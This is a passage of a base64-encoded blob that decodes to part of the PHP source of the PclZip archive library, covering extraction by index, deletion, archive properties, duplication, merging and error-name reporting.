Ql9QT1NUX0VYVFJBQ1QgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1NFVF9DSE1PRCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQllfTkFNRSA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQllfRVJFRyA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQllfUFJFRyA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQllfSU5ERVggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0VYVFJBQ1RfQVNfU1RSSU5HID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9FWFRSQUNUX0lOX09VVFBVVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfUkVQTEFDRV9ORVdFUiA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLFBDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUiA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLFBDTFpJUF9PUFRfRVhUUkFDVF9ESVJfUkVTVFJJQ1RJT04gPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTEQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiA9PiAnb3B0aW9uYWwnDQoJCQkJCQkJCQkJCSAgICApKTsNCiAgICAgIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgICAgICByZXR1cm4gMDsNCiAgICAgIH0NCg0KICAgICAgaWYgKGlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9QQVRIXSkpIHsNCiAgICAgICAgJHZfcGF0aCA9ICR2X29wdGlvbnNbUENMWklQX09QVF9QQVRIXTsNCiAgICAgIH0NCiAgICAgIGlmIChpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEhdKSkgew0KICAgICAgICAkdl9yZW1vdmVfcGF0aCA9ICR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF07DQogICAgICB9DQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSF0pKSB7DQogICAgICAgICR2X3JlbW92ZV9hbGxfcGF0aCA9ICR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEhdOw0KICAgICAgfQ0KICAgICAgaWYgKGlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF0pKSB7DQogICAgICAgIGlmICgoc3RybGVuKCR2X3BhdGgpID4gMCkgJiYgKHN1YnN0cigkdl9wYXRoLCAtMSkgIT0gJy8nKSkgew0KICAgICAgICAgICR2X3BhdGggLj0gJy8nOw0KICAgICAgICB9DQogICAgICAgICR2X3BhdGggLj0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9QQVRIXTsNCiAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlIHsNCg0KICAgICAgJHZfcGF0aCA9ICR2X2FyZ19saXN0WzBdOw0KDQogICAgICBpZiAoJHZfc2l6ZSA9PSAyKSB7DQogICAgICAgICR2X3JlbW92ZV9wYXRoID0gJHZfYXJnX2xpc3RbMV07DQogICAgICB9DQogICAgICBlbHNlIGlmICgkdl9zaXplID4gMikgew0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiSW52YWxpZCBudW1iZXIgLyB0eXBlIG9mIGFyZ3VtZW50cyIpOw0KDQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogICR0aGlzLT5wcml2T3B0aW9uRGVmYXVsdFRocmVzaG9sZCgkdl9vcHRpb25zKTsNCg0KDQogICRwX2xpc3QgPSBhcnJheSgpOw0KICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkV4dHJhY3RCeVJ1bGUoJHBfbGlzdCwgJHZfcGF0aCwgJHZfcmVtb3ZlX3BhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfcmVtb3ZlX2FsbF9wYXRoLCAkdl9vcHRpb25zKTsNCiAgaWYgKCR2X3Jlc3VsdCA8IDEpIHsNCiAgICB1bnNldCgkcF9saXN0KTsNCiAgICByZXR1cm4oMCk7DQogIH0NCg0KICByZXR1cm4gJHBfbGlzdDsNCn0NCg0KDQoNCmZ1bmN0aW9uIGV4dHJhY3RCeUluZGV4KCRwX2luZGV4KQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICBpZiAoISR0aGlzLT5wcml2Q2hlY2tGb3JtYXQoKSkgew0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogICR2X29wdGlvbnMgPSBhcnJheSgpOw0KICAkdl9wYXRoID0gJyc7DQogICR2X3JlbW92ZV9wYXRoID0gIiI7DQogICR2X3JlbW92ZV9hbGxfcGF0aCA9IGZhbHNlOw0KDQogICR2X3NpemUgPSBmdW5jX251bV9hcmdzKCk7DQoNCiAgJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX0VYVFJBQ1RfQVNfU1RSSU5HXSA9IEZBTFNFOw0KDQogIGlmICgkdl9zaXplID4gMSkgew0KICAgICR2X2FyZ19saXN0ID0gZnVuY19nZXRfYXJncygpOw0KDQogICAgYXJyYXlfc2hpZnQoJHZfYXJnX2xpc3QpOw0KICAgICR2X3NpemUtLTsNCg0KICAgIGlmICgoaXNfaW50ZWdlcigkdl9hcmdfbGlzdFswXSkpICYmICgkdl9hcmdfbGlzdFswXSA+IDc3MDAwKSkgew0KDQogICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlBhcnNlT3B0aW9ucygkdl9hcmdfbGlzdCwgJHZfc2l6ZSwgJHZfb3B0aW9ucywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5IChQQ0xaSVBfT1BUX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0VYVFJBQ1RfQVNfU1RSSU5HID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9BRERfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9DQl9QUkVfRVhUUkFDVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9DQl9QT1NUX0VYVFJBQ1QgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1NFVF9DSE1PRCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfUkVQTEFDRV9ORVdFUiA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLFBDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUiA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLFBDTFpJUF9PUFRfRVhUUkFDVF9ESVJfUkVTVFJJQ1RJT04gPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTEQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiA9PiAnb3B0aW9uYWwnDQoJCQkJCQkJCQkJCSAgICkpOw0KICAgICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KDQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1BBVEhdKSkgew0KICAgICAgICAkdl9wYXRoID0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1BBVEhdOw0KICAgICAgfQ0KICAgICAgaWYgKGlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF0pKSB7DQogICAgICAgICR2X3JlbW92ZV9wYXRoID0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIXTsNCiAgICAgIH0NCiAgICAgIGlmIChpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpIHsNCiAgICAgICAgJHZfcmVtb3ZlX2FsbF9wYXRoID0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSF07DQogICAgICB9DQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9QQVRIXSkpIHsNCiAgICAgICAgaWYgKChzdHJsZW4oJHZfcGF0aCkgPiAwKSAmJiAoc3Vic3RyKCR2X3BhdGgsIC0xKSAhPSAnLycpKSB7DQogICAgICAgICAgJHZfcGF0aCAuPSAnLyc7DQogICAgICAgIH0NCiAgICAgICAgJHZfcGF0aCAuPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfQUREX1BBVEhdOw0KICAgICAgfQ0KICAgICAgaWYgKCFpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkddKSkgew0KICAgICAgICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkddID0gRkFMU0U7DQogICAgICB9DQogICAgICBlbHNlIHsNCiAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlIHsNCg0KICAgICAgJHZfcGF0aCA9ICR2X2FyZ19saXN0WzBdOw0KDQogICAgICBpZiAoJHZfc2l6ZSA9PSAyKSB7DQogICAgICAgICR2X3JlbW92ZV9wYXRoID0gJHZfYXJnX2xpc3RbMV07DQogICAgICB9DQogICAgICBlbHNlIGlmICgkdl9zaXplID4gMikgew0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiSW52YWxpZCBudW1iZXIgLyB0eXBlIG9mIGFyZ3VtZW50cyIpOw0KDQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQoNCiAgJHZfYXJnX3RyaWNrID0gYXJyYXkgKFBDTFpJUF9PUFRfQllfSU5ERVgsICRwX2luZGV4KTsNCiAgJHZfb3B0aW9uc190cmljayA9IGFycmF5KCk7DQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UGFyc2VPcHRpb25zKCR2X2FyZ190cmljaywgc2l6ZW9mKCR2X2FyZ190cmljayksICR2X29wdGlvbnNfdHJpY2ssDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5IChQQ0xaSVBfT1BUX0JZX0lOREVYID0+ICdvcHRpb25hbCcgKSk7DQogIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgICAgcmV0dXJuIDA7DQogIH0NCiAgJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXSA9ICR2X29wdGlvbnNfdHJpY2tbUENMWklQX09QVF9CWV9JTkRFWF07DQoNCiAgJHRoaXMtPnByaXZPcHRpb25EZWZhdWx0VGhyZXNob2xkKCR2X29wdGlvbnMpOw0KDQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZFeHRyYWN0QnlSdWxlKCRwX2xpc3QsICR2X3BhdGgsICR2X3JlbW92ZV9wYXRoLCAkdl9yZW1vdmVfYWxsX3BhdGgsICR2X29wdGlvbnMpKSA8IDEpIHsNCiAgICAgIHJldHVybigwKTsNCiAgfQ0KDQogIHJldHVybiAkcF9saXN0Ow0KfQ0KDQpmdW5jdGlvbiBkZWxldGUoKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICBpZiAoISR0aGlzLT5wcml2Q2hlY2tGb3JtYXQoKSkgew0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogICR2X29wdGlvbnMgPSBhcnJheSgpOw0KDQogICR2X3NpemUgPSBmdW5jX251bV9hcmdzKCk7DQoNCiAgaWYgKCR2X3NpemUgPiAwKSB7DQogICAgJHZfYXJnX2xpc3QgPSBmdW5jX2dldF9hcmdzKCk7DQoNCiAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlBhcnNlT3B0aW9ucygkdl9hcmdfbGlzdCwgJHZfc2l6ZSwgJHZfb3B0aW9ucywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkgKFBDTFpJUF9PUFRfQllfTkFNRSA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9FUkVHID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0JZX1BSRUcgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQllfSU5ERVggPT4gJ29wdGlvbmFsJyApKTsNCiAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICB9DQoNCiAgJHRoaXMtPnByaXZEaXNhYmxlTWFnaWNRdW90ZXMoKTsNCg0KICAkdl9saXN0ID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkRlbGV0ZUJ5UnVsZSgkdl9saXN0LCAkdl9vcHRpb25zKSkgIT0gMSkgew0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgIHVuc2V0KCR2X2xpc3QpOw0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogIHJldHVybiAkdl9saXN0Ow0KfQ0KDQpmdW5jdGlvbiBkZWxldGVCeUluZGV4KCRwX2luZGV4KQ0Kew0KICANCiAgJHBfbGlzdCA9ICR0aGlzLT5kZWxldGUoUENMWklQX09QVF9CWV9JTkRFWCwgJHBfaW5kZXgpOw0KDQogIHJldHVybiAkcF9saXN0Ow0KfQ0KDQpmdW5jdGlvbiBwcm9wZXJ0aWVzKCkNCnsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICAkdGhpcy0+cHJpdkRpc2FibGVNYWdpY1F1b3RlcygpOw0KDQogIGlmICghJHRoaXMtPnByaXZDaGVja0Zvcm1hdCgpKSB7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgJHZfcHJvcCA9IGFycmF5KCk7DQogICR2X3Byb3BbJ2NvbW1lbnQnXSA9ICcnOw0KICAkdl9wcm9wWyduYiddID0gMDsNCiAgJHZfcHJvcFsnc3RhdHVzJ10gPSAnbm90X2V4aXN0JzsNCg0KICBpZiAoQGlzX2ZpbGUoJHRoaXMtPnppcG5hbWUpKQ0KICB7DQogICAgaWYgKCgkdGhpcy0+emlwX2ZkID0gQGZvcGVuKCR0aGlzLT56aXBuYW1lLCAncmInKSkgPT0gMCkNCiAgICB7DQogICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgIA0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIGFyY2hpdmUgXCcnLiR0aGlzLT56aXBuYW1lLidcJyBpbiBiaW5hcnkgcmVhZCBtb2RlJyk7DQoNCiAgICAgIHJldHVybiAwOw0KICAgIH0NCg0KICAgICR2X2NlbnRyYWxfZGlyID0gYXJyYXkoKTsNCiAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZEVuZENlbnRyYWxEaXIoJHZfY2VudHJhbF9kaXIpKSAhPSAxKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgcmV0dXJuIDA7DQogICAgfQ0KDQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICAkdl9wcm9wWydjb21tZW50J10gPSAkdl9jZW50cmFsX2RpclsnY29tbWVudCddOw0KICAgICR2X3Byb3BbJ25iJ10gPSAkdl9jZW50cmFsX2RpclsnZW50cmllcyddOw0KICAgICR2X3Byb3BbJ3N0YXR1cyddID0gJ29rJzsNCiAgfQ0KDQogICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogIHJldHVybiAkdl9wcm9wOw0KfQ0KDQpmdW5jdGlvbiBkdXBsaWNhdGUoJHBfYXJjaGl2ZSkNCnsNCiAgJHZfcmVzdWx0ID0gMTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICBpZiAoKGlzX29iamVjdCgkcF9hcmNoaXZlKSkgJiYgKGdldF9jbGFzcygkcF9hcmNoaXZlKSA9PSAncGNsemlwJykpDQogIHsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RHVwbGljYXRlKCRwX2FyY2hpdmUtPnppcG5hbWUpOw0KICB9DQoNCiAgZWxzZSBpZiAoaXNfc3RyaW5nKCRwX2FyY2hpdmUpKQ0KICB7DQoNCiAgICBpZiAoIWlzX2ZpbGUoJHBfYXJjaGl2ZSkpIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19GSUxFLCAiTm8gZmlsZSB3aXRoIGZpbGVuYW1lICciLiRwX2FyY2hpdmUuIiciKTsNCiAgICAgICR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfTUlTU0lOR19GSUxFOw0KICAgIH0NCiAgICBlbHNlIHsNCiAgICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RHVwbGljYXRlKCRwX2FyY2hpdmUpOw0KICAgIH0NCiAgfQ0KDQogIGVsc2UNCiAgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIHZhcmlhYmxlIHR5cGUgcF9hcmNoaXZlX3RvX2FkZCIpOw0KICAgICR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVI7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBtZXJnZSgkcF9hcmNoaXZlX3RvX2FkZCkNCnsNCiAgJHZfcmVzdWx0ID0gMTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICBpZiAoISR0aGlzLT5wcml2Q2hlY2tGb3JtYXQoKSkgew0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogIGlmICgoaXNfb2JqZWN0KCRwX2FyY2hpdmVfdG9fYWRkKSkgJiYgKGdldF9jbGFzcygkcF9hcmNoaXZlX3RvX2FkZCkgPT0gJ3BjbHppcCcpKQ0KICB7DQoNCiAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdk1lcmdlKCRwX2FyY2hpdmVfdG9fYWRkKTsNCiAgfQ0KDQogIGVsc2UgaWYgKGlzX3N0cmluZygkcF9hcmNoaXZlX3RvX2FkZCkpDQogIHsNCg0KICAgICR2X29iamVjdF9hcmNoaXZlID0gbmV3IFBjbFppcCgkcF9hcmNoaXZlX3RvX2FkZCk7DQoNCiAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdk1lcmdlKCR2X29iamVjdF9hcmNoaXZlKTsNCiAgfQ0KDQogIGVsc2UNCiAgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIHZhcmlhYmxlIHR5cGUgcF9hcmNoaXZlX3RvX2FkZCIpOw0KICAgICR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVI7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQoNCg0KZnVuY3Rpb24gZXJyb3JDb2RlKCkNCnsNCiAgaWYgKFBDTFpJUF9FUlJPUl9FWFRFUk5BTCA9PSAxKSB7DQogICAgcmV0dXJuKFBjbEVycm9yQ29kZSgpKTsNCiAgfQ0KICBlbHNlIHsNCiAgICByZXR1cm4oJHRoaXMtPmVycm9yX2NvZGUpOw0KICB9DQp9DQoNCmZ1bmN0aW9uIGVycm9yTmFtZSgkcF93aXRoX2NvZGU9ZmFsc2UpDQp7DQogICR2X25hbWUgPSBhcnJheSAoIFBDTFpJUF9FUlJfTk9fRVJST1IgPT4gJ1BDTFpJUF9FUlJfTk9fRVJST1InLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX1dSSVRFX09QRU5fRkFJTCA9PiAnUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMID0+ICdQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiA9PiAnUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUicsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfTUlTU0lOR19GSUxFID0+ICdQQ0xaSVBfRVJSX01JU1NJTkdfRklMRScsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfRklMRU5BTUVfVE9PX0xPTkcgPT4gJ1BDTFpJUF9FUlJfRklMRU5BTUVfVE9PX0xPTkcnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0lOVkFMSURfWklQID0+ICdQQ0xaSVBfRVJSX0lOVkFMSURfWklQJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9CQURfRVhUUkFDVEVEX0ZJTEUgPT4gJ1BDTFpJUF9FUlJfQkFEX0VYVFJBQ1RFRF9GSUxFJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9ESVJfQ1JFQVRFX0ZBSUwgPT4gJ1BDTFpJUF9FUlJfRElSX0NSRUFURV9GQUlMJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9CQURfRVhURU5TSU9OID0+ICdQQ0xaSVBfRVJSX0JBRF9FWFRFTlNJT04nLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0JBRF9GT1JNQVQgPT4gJ1BDTFpJUF9FUlJfQkFEX0ZPUk1BVCcsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfREVMRVRFX0ZJTEVfRkFJTCA9PiAnUENMWklQX0VSUl9ERUxFVEVfRklMRV9GQUlMJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9SRU5BTUVfRklMRV9GQUlMID0+ICdQQ0xaSVBfRVJSX1JFTkFNRV9GSUxFX0ZBSUwnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0JBRF9DSEVDS1NVTSA9PiAnUENMWklQX0VSUl9CQURfQ0hFQ0tTVU0nLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0lOVkFMSURfQVJDSElWRV9aSVAgPT4gJ1BDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCcsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUgPT4gJ1BDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0lOVkFMSURfT1BUSU9OX1ZBTFVFID0+ICdQQ0xaSVBfRVJSX0lOVkFMSURfT1BUSU9OX1ZBTFVFJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9VTlNVUFBPUlRFRF9DT01QUkVTU0lPTiA9PiAnUENMWklQX0VSUl9VTlNVUFBPUlRFRF9DT01QUkVTU0lPTicsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfVU5TVVBQT1JURURfRU5DUllQVElPTiA9PiAnUENMWklQX0VSUl9VTlNVUFBPUlRFRF9FTkNSWVBUSU9OJw0KICAgICAgICAgICAgICAgICAgICAsUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSA9PiAnUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRScNCiAgICAgICAgICAgICAgICAgICAgLFBDTFpJUF9FUlJfRElSRUNUT1JZX1JFU1RSSUNUSU9OID0+ICdQQ0xaSVBfRVJSX0RJUkVDVE9SWV9SRVNUUklDVElPTicNCiAgICAgICAgICAgICAgICAgICk7DQoNCiAgaWYgKGlzc2V0KCR2X25hbWVbJHRoaXMtPmVycm9yX2NvZGVdKSkgew0KICAgICR2X3ZhbHVlID0gJHZfbmFtZVskdGhpcy0+ZXJyb3JfY29kZV07DQogIH0NCiAgZWxzZSB7DQogICAgJHZfdmFsdWUgPSAnTm9OYW1lJzsNCiAgfQ0KDQogIGlmICgkcF93aXRoX2NvZGUpIHsNCiAgICByZXR1cm4oJHZfdmFsdWUuJyAoJy4kdGhpcy0+ZXJyb3JfY29kZS4nKScpOw0KICB9DQogIGVsc2Ugew0KICAgIHJldHVybigkdl92YWx1ZSk7DQogIH0NCn0NCg0KZnVuY3Rpb24gZXJyb3JJbmZvKCRwX2Z1bGw9ZmFsc2UpDQp7DQogIGlmIChQQ0xaSVBfRVJST1JfRVhURVJOQUwgPT0gMSkgew0KICAgIHJldHVybihQY2xFcnJvclN0cmluZygpKTsNCiAgfQ0KICBlbHNlIHsNCiAgICBpZiAoJHBfZnVsbCkgew0KICAgICAgcmV0dXJuKCR0aGlzLT5lcnJvck5hbWUodHJ1ZSkuIiA6ICIuJHRoaXMtPmVycm9yX3N0cmluZyk7DQogICAgfQ0KICAgIGVsc2Ugew0KICAgICAgcmV0dXJuKCR0aGlzLT5lcnJvcl9zdHJpbmcuIiBbY29kZSAiLiR0aGlzLT5lcnJvcl9jb2RlLiJdIik7DQogICAgfQ0KICB9DQp9DQoNCg0KDQoNCg0KZnVuY3Rpb24gcHJpdkNoZWNrRm9ybWF0KCRwX2xldmVsPTApDQp7DQogICR2X3Jlc3VsdCA9IHRydWU7DQoNCiAgY2xlYXJzdGF0Y2FjaGUoKTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICBpZiAoIWlzX2Zp